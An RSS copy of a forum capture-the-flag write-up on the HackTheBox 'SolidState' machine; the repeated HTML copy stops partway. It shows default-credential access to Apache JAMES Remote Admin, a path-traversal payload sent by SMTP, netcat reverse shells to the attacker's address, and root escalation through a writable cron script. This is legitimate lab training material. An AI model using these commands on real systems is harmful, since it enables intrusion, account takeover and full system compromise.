<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>HTB SolidState write-up</title>
    <link>https://0x00sec.org/t/htb-solidstate-write-up/5129</link>
    <description>This is my write-up for the [SolidState](https://www.hackthebox.eu/home/machines/profile/85) machine provided by [HackTheBox](https://www.hackthebox.eu) and created by [ch33zplz](https://www.hackthebox.eu/home/users/profile/3338).

Sup fellow padawans, this was an interesting box because the exploit had to be done in stages. This goes to show that proper enumeration, and really thinking about what an exploit is doing can save you a lot of time. It also saved us the trouble of taking part in the bloodbath that is reset hell. ```¯\_(ツ)_/¯```

I&#39;ll be breaking the post up into three phases:
* [Phase 1 - Enumeration](#enumeration)
* [Phase 2 - Exploitation](#exploitation)
* [Phase 3 - Privilege Escalation](#privilege-escalation)

&lt;a name=&quot;enumeration&quot;&gt;&lt;/a&gt;
## Phase 1 - Enumeration
As always we&#39;ll start off with a simple ```nmap``` scan to see what&#39;s out there.
```bash
➜  ~ nmap --open -p- -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.51

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 20:03 EST
Nmap scan report for 10.10.10.51
Host is up (0.12s latency).
Not shown: 61105 closed ports, 4424 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

Taking the discovered ports, we&#39;ll now run detailed scan. This will be much faster than scanning ```-p-```.
```
➜  ~ nmap -A -p22,25,80,110,119,4555 --open -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.51

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 20:14 EST
Nmap scan report for 10.10.10.51
Host is up (0.12s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.82 [10.10.15.82]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
```

Needless to say Remote Admin sounds the most interesting, but as always, we have a look at ```Apache``` first. I normally always use curl as it&#39;s less likely to hide bits in random places, and why not exercise those parsing muscles with a few pipes to pull data you think may be useful from the page, such as E-Mail addresses.
```bash
➜  ~ curl http://10.10.10.51 2&gt;/dev/null | grep &quot;@&quot; | cut -d&quot;&gt;&quot; -f3 | cut -d&quot;&lt;&quot; -f1
webadmin@solid-state-security.com
```

Cool, so we did find an E-Mail, and our target is likely a mail server. Maybe we&#39;ll need this later, maybe not, might as well save it.

A quick poke on [exploit-db](https://www.exploit-db.com) and you&#39;ll find [this](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf) PDF, which shows how you can achieve remote code execution on ```Apache JAMES``` by overwriting ```/etc/bash_completion.d``` by creating the user ```../../../../../../../../etc/bash_completion.d``` in ```JAMES Remote Admin``` and then sending an E-Mail to them with a nested command in the body which will be executed when a user logs in next. However, we should put this in the back of our mind for now and first check if the default login for ```JAMES Remote Admin``` has been changed.
```bash
➜  ~ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Great, so we have root access to ```JAMES Remote Admin```, but what can we do with this?
```
HELP
listusers                               display existing accounts
adduser [username] [password]           add a new user
setpassword [username] [password]       sets a user&#39;s password
--trimmed due to size---
```

Let&#39;s start by investigating the different mailboxes, we&#39;ll change Mindy&#39;s password so we can login to the ```JAMES pop3``` server.
```bash
setpassword mindy password
Password for mindy reset
```

Now we can login to Mindy&#39;s E-Mail, by initiating a telnet connection to ```port 110```. You can also check out the other mailboxes afterwards.
```bash
➜  ~ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is &#39;^]&#39;.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for &lt;mindy@localhost&gt;;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```

Here we go again, what is with people sending their ```SSH``` credentials all willy-nilly?! However, it&#39;s okay because clearly they have top-notch security in a restricted shell. Before we move on let&#39;s quickly see what ```port 119``` is.
```bash
➜  ~ telnet 10.10.10.51 119
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is &#39;^]&#39;.
200 solidstate NNTP Service Ready, posting permitted
LIST
215 list of newsgroups follows
org.apache.james.dev 0 0 y
org.apache.avalon.dev 0 0 y
org.apache.avalon.user 0 0 y
org.apache.james.user 0 0 y
.
```

Seems like some kind of news server, a quick google found [this](https://www.ibm.com/developerworks/library/j-james1/index.html), and indeed, ```&quot;The first of these is NNTP support, which allows James to act as a Usenet server&quot;```, we&#39;ll leave this alone for now. Back on track, let&#39;s try out that ```SSH``` login!

&lt;a name=&quot;exploitation&quot;&gt;&lt;/a&gt;
## Phase 2 - Exploitation
```bash
➜  ~ ssh mindy@10.10.10.51
mindy@10.10.10.51s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
```

Let&#39;s grab our user flag and check out how restricted this shell actually is!
```bash
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
914d0a4ebc177889b5b89a23f556fd75
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ /usr/bin/id
-rbash: /usr/bin/id: restricted: cannot specify &#39;/&#39; in command names
mindy@solidstate:~$ export -p
declare -rx PATH=&quot;/home/mindy/bin&quot;
declare -rx SHELL=&quot;/bin/rbash&quot;

```

So right off the bat we can see our path is ```/home/mindy/bin``` and we cannot write to this enviromental variable to change our path. In addition commands including ```/``` will be ignored, so we cannot use the full path to a binary. Lastly we see we are locked into an ```rbash``` shell, which also, is not writable. This is where the exploit mentioned earlier comes into play, we now have a user to login with to trigger our exploit, so we just need to prep a bit.

First we&#39;ll log back into ```JAMES Remote Admin``` to add the user mentioned in the exploit.
```bash
➜  ~ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d exploit
User ../../../../../../../../etc/bash_completion.d added
```

Now that this user is created, we can use the open ```JAMES smtp``` server on ```port 25``` to send the message including our payload.
```bash
➜  ~ telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is &#39;^]&#39;.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Fri, 26 Jan 2018 23:24:57 -0500 (EST)
EHLO dostoevsky@solidstate
250-solidstate Hello dostoevsky@solidstate (10.10.15.82 [10.10.15.82])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: &lt;&#39;@solidstate&gt;
250 2.1.0 Sender &lt;&#39;@solidstate&gt; OK
RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
DATA
354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
FROM: dostoevsky@solidstate
&#39;
/bin/nc -e /bin/bash 10.10.15.82 8000
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
```

Lastly, we setup a listener, when the user mindy logs into ssh it will execute the reverse shell. Below you can see the output from ```SSH``` as it loses all its shit.
```bash
➜  ~ ssh mindy@10.10.10.51
mindy@10.10.10.51s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 26 23:20:16 2018 from 10.10.15.82
-rbash: $&#39;\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003&#39;: command not found
-rbash: L: command not found
--trimmed due to size---
```

*Note: if another user beat you to this exploit you can actually bypass rbash all together by pressing CTRL+C a few times, making this whole process way quicker.*

And here&#39;s our reverse shell!
```bash
➜  ~ nc -vlnp 8000
listening on [any] 8000 ...
connect to [10.10.15.82] from (UNKNOWN) [10.10.10.51] 56316
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```

Moving on let&#39;s see what we can figure out about the system. By ```grepping``` ```ps``` for ```James``` we find it&#39;s running a ```bash``` script and ```jvm``` from the ```/opt``` directory. These are things we should investigate, however, poking around at them I wasn&#39;t able to find anything interesting.
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux | grep james
root       352  0.0  0.1   2332   516 ?        Ss   20:08   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
root       383  0.3  7.4 445428 37816 ?        Sl   20:08   0:11 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
```

Next let&#39;s have a look for some system crons. We find some, however, it&#39;s doing nothing interesting. Let&#39;s check out the ```/opt``` directory ```James``` is running from.
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /opt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22 13:32 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22 12:01 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22 13:32 tmp.py
```

Interesting a ```root``` owned, writable ```python``` script.
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system(&#39;rm -r /tmp/* &#39;)
except:
     sys.exit()
```

So we didn&#39;t find any cron for this script, but we can test whether this script is being run, and even time the interval between execution.
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ touch test
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls -l
total 0
-rw-rw---- 1 mindy mindy 0 Jan 26 21:13 test
---some time passes---
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
```

Great, so the files in ```/tmp``` are being deleted. Let&#39;s add a little bit of code to execute at the end of ```tmp.py```

&lt;a name=&quot;privilege-escalation&quot;&gt;&lt;/a&gt;
## Phase 3 - Privilege Escalation
```bash
mindy@solidstate:/tmp$ cd /opt
mindy@solidstate:/opt$ echo &quot;os.system(&#39;/bin/nc -e /bin/bash 10.10.15.82 8001&#39;)&quot; &gt;&gt; tmp.py
mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system(&#39;rm -r /tmp/* &#39;)
except:
     sys.exit()

os.system(&#39;/bin/nc -e /bin/bash 10.10.15.82 8001&#39;)
```

Now, we wait for our shell.
```bash
➜  ~ nc -vlnp 8001 
listening on [any] 8001 ...
connect to [10.10.15.82] from (UNKNOWN) [10.10.10.51] 45182
id
uid=0(root) gid=0(root) groups=0(root)  &lt;-- bask in the glory of shell!
cd /root
ls
root.txt
cat root.txt
b4c9723a28899b1c45db281d99cc87c9
```

Let&#39;s also see what the cron was that ran this with our fancy new root privileges.
```bash
crontab -l
---trimmed due to size---
*/3 * * * * python /opt/tmp.py
```

Well, this box was way easier than one would have thought. We saved time by properly reading through the public exploit from ```exploit-db```. All in all, this was a fun box.

Hope you enjoyed reading, happy hacking.</description>
    
    <lastBuildDate>Sat, 27 Jan 2018 15:10:55 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/htb-solidstate-write-up/5129.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>HTB SolidState write-up</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-solidstate-write-up/5129/9</link>
        <pubDate>Mon, 26 Feb 2018 15:18:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5129-9</guid>
        <source url="https://0x00sec.org/t/htb-solidstate-write-up/5129.rss">HTB SolidState write-up</source>
      </item>
      <item>
        <title>HTB SolidState write-up</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-solidstate-write-up/5129/7</link>
        <pubDate>Sun, 28 Jan 2018 08:13:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5129-7</guid>
        <source url="https://0x00sec.org/t/htb-solidstate-write-up/5129.rss">HTB SolidState write-up</source>
      </item>
      <item>
        <title>HTB SolidState write-up</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-solidstate-write-up/5129/3</link>
        <pubDate>Sat, 27 Jan 2018 16:17:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5129-3</guid>
        <source url="https://0x00sec.org/t/htb-solidstate-write-up/5129.rss">HTB SolidState write-up</source>
      </item>
      <item>
        <title>HTB SolidState write-up</title>
        <dc:creator><![CDATA[dostoevsky]]></dc:creator>
        <description><![CDATA[
            <p>This is my write-up for the <a href="https://www.hackthebox.eu/home/machines/profile/85" rel="nofollow noopener">SolidState</a> machine provided by <a href="https://www.hackthebox.eu" rel="nofollow noopener">HackTheBox</a> and created by <a href="https://www.hackthebox.eu/home/users/profile/3338" rel="nofollow noopener">ch33zplz</a>.</p>
<p>Sup fellow padawans, this was an interesting box because the exploit had to be done in stages. This goes to show that proper enumeration, and really thinking about what an exploit is doing can save you a lot of time. It also saved us the trouble of taking part in the bloodbath that is reset hell. <code>¯\_(ツ)_/¯</code></p>
<p>I’ll be breaking the post up into three phases:</p>
<ul>
<li><a href="https://0x00sec.org#enumeration">Phase 1 - Enumeration</a></li>
<li><a href="https://0x00sec.org#exploitation">Phase 2 - Exploitation</a></li>
<li><a href="https://0x00sec.org#privilege-escalation">Phase 3 - Privilege Escalation</a></li>
</ul>
<p><a name="enumeration" href="https://0x00sec.org"></a></p>
<h2>Phase 1 - Enumeration</h2>
<p>As always we’ll start off with a simple <code>nmap</code> scan to see what’s out there.</p>
<pre><code class="lang-bash">➜  ~ nmap --open -p- -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.51

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 20:03 EST
Nmap scan report for 10.10.10.51
Host is up (0.12s latency).
Not shown: 61105 closed ports, 4424 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
</code></pre>
<p>Taking the discovered ports, we’ll now run detailed scan. This will be much faster than scanning <code>-p-</code>.</p>
<pre><code class="lang-auto">➜  ~ nmap -A -p22,25,80,110,119,4555 --open -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.51

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-26 20:14 EST
Nmap scan report for 10.10.10.51
Host is up (0.12s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.82 [10.10.15.82]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds
</code></pre>
<p>Needless to say Remote Admin sounds the most interesting, but as always, we have a look at <code>Apache</code> first. I normally always use curl as it’s less likely to hide bits in random places, and why not exercise those parsing muscles with a few pipes to pull data you think may be useful from the page, such as E-Mail addresses.</p>
<pre><code class="lang-bash">➜  ~ curl http://10.10.10.51 2&gt;/dev/null | grep "@" | cut -d"&gt;" -f3 | cut -d"&lt;" -f1
webadmin@solid-state-security.com
</code></pre>
<p>Cool, so we did find an E-Mail, and our target is likely a mail server. Maybe we’ll need this later, maybe not, might as well save it.</p>
<p>A quick poke on <a href="https://www.exploit-db.com" rel="nofollow noopener">exploit-db</a> and you’ll find <a href="https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf" rel="nofollow noopener">this</a> PDF, which shows how you can achieve remote code execution on <code>Apache JAMES</code> by overwriting <code>/etc/bash_completion.d</code> by creating the user <code>../../../../../../../../etc/bash_completion.d</code> in <code>JAMES Remote Admin</code> and then sending an E-Mail to them with a nested command in the body which will be executed when a user logs in next. However, we should put this in the back of our mind for now and first check if the default login for <code>JAMES Remote Admin</code> has been changed.</p>
<pre><code class="lang-bash">➜  ~ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
</code></pre>
<p>Great, so we have root access to <code>JAMES Remote Admin</code>, but what can we do with this?</p>
<pre><code class="lang-auto">HELP
listusers                               display existing accounts
adduser [username] [password]           add a new user
setpassword [username] [password]       sets a user's password
--trimmed due to size---
</code></pre>
<p>Let’s start by investigating the different mailboxes, we’ll change Mindy’s password so we can login to the <code>JAMES pop3</code> server.</p>
<pre><code class="lang-bash">setpassword mindy password
Password for mindy reset
</code></pre>
<p>Now we can login to Mindy’s E-Mail, by initiating a telnet connection to <code>port 110</code>. You can also check out the other mailboxes afterwards.</p>
<pre><code class="lang-bash">➜  ~ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for &lt;mindy@localhost&gt;;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
</code></pre>
<p>Here we go again, what is with people sending their <code>SSH</code> credentials all willy-nilly?! However, it’s okay because clearly they have top-notch security in a restricted shell. Before we move on let’s quickly see what <code>port 119</code> is.</p>
<pre><code class="lang-bash">➜  ~ telnet 10.10.10.51 119
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
200 solidstate NNTP Service Ready, posting permitted
LIST
215 list of newsgroups follows
org.apache.james.dev 0 0 y
org.apache.avalon.dev 0 0 y
org.apache.avalon.user 0 0 y
org.apache.james.user 0 0 y
.
</code></pre>
<p>Seems like some kind of news server, a quick google found <a href="https://www.ibm.com/developerworks/library/j-james1/index.html" rel="nofollow noopener">this</a>, and indeed, <code>"The first of these is NNTP support, which allows James to act as a Usenet server"</code>, we’ll leave this alone for now. Back on track, let’s try out that <code>SSH</code> login!</p>
<p><a name="exploitation" href="https://0x00sec.org"></a></p>
<h2>Phase 2 - Exploitation</h2>
<pre><code class="lang-bash">➜  ~ ssh mindy@10.10.10.51
mindy@10.10.10.51s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
</code></pre>
<p>Let’s grab our user flag and check out how restricted this shell actually is!</p>
<pre><code class="lang-bash">mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
914d0a4ebc177889b5b89a23f556fd75
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ /usr/bin/id
-rbash: /usr/bin/id: restricted: cannot specify '/' in command names
mindy@solidstate:~$ export -p
declare -rx PATH="/home/mindy/bin"
declare -rx SHELL="/bin/rbash"

</code></pre>
<p>So right off the bat we can see our path is <code>/home/mindy/bin</code> and we cannot write to this enviromental variable to change our path. In addition commands including <code>/</code> will be ignored, so we cannot use the full path to a binary. Lastly we see we are locked into an <code>rbash</code> shell, which also, is not writable. This is where the exploit mentioned earlier comes into play, we now have a user to login with to trigger our exploit, so we just need to prep a bit.</p>
<p>First we’ll log back into <code>JAMES Remote Admin</code> to add the user mentioned in the exploit.</p>
<pre><code class="lang-bash">➜  ~ nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d exploit
User ../../../../../../../../etc/bash_completion.d added
</code></pre>
<p>Now that this user is created, we can use the open <code>JAMES smtp</code> server on <code>port 25</code> to send the message including our payload.</p>
<pre><code class="lang-bash">➜  ~ telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Fri, 26 Jan 2018 23:24:57 -0500 (EST)
EHLO dostoevsky@solidstate
250-solidstate Hello dostoevsky@solidstate (10.10.15.82 [10.10.15.82])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: &lt;'@solidstate&gt;
250 2.1.0 Sender &lt;'@solidstate&gt; OK
RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
DATA
354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
FROM: dostoevsky@solidstate
'
/bin/nc -e /bin/bash 10.10.15.82 8000
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
</code></pre>
<p>Lastly, we setup a listener, when the user mindy logs into ssh it will execute the reverse shell. Below you can see the output from <code>SSH</code> as it loses all its shit.</p>
<pre><code class="lang-bash">➜  ~ ssh mindy@10.10.10.51
mindy@10.10.10.51s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 26 23:20:16 2018 from 10.10.15.82
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
--trimmed due to size---
</code></pre>
<p><em>Note: if another user beat you to this exploit you can actually bypass rbash all together by pressing CTRL+C a few times, making this whole process way quicker.</em></p>
<p>And here’s our reverse shell!</p>
<pre><code class="lang-bash">➜  ~ nc -vlnp 8000
listening on [any] 8000 ...
connect to [10.10.15.82] from (UNKNOWN) [10.10.10.51] 56316
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
python -c 'import pty;pty.spawn("/bin/bash");'
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
</code></pre>
<p>Moving on let’s see what we can figure out about the system. By <code>grepping</code> <code>ps</code> for <code>James</code> we find it’s running a <code>bash</code> script and <code>jvm</code> from the <code>/opt</code> directory. These are things we should investigate, however, poking around at them I wasn’t able to find anything interesting.</p>
<pre><code class="lang-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux | grep james
root       352  0.0  0.1   2332   516 ?        Ss   20:08   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
root       383  0.3  7.4 445428 37816 ?        Sl   20:08   0:11 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
</code></pre>
<p>Next let’s have a look for some system crons. We find some, however, it’s doing nothing interesting. Let’s check out the <code>/opt</code> directory <code>James</code> is running from.</p>
<pre><code class="lang-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /opt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22 13:32 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22 12:01 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22 13:32 tmp.py
</code></pre>
<p>Interesting a <code>root</code> owned, writable <code>python</code> script.</p>
<pre><code class="lang-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
</code></pre>
<p>So we didn’t find any cron for this script, but we can test whether this script is being run, and even time the interval between execution.</p>
<pre><code class="lang-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ touch test
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls -l
total 0
-rw-rw---- 1 mindy mindy 0 Jan 26 21:13 test
---some time passes---
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
</code></pre>
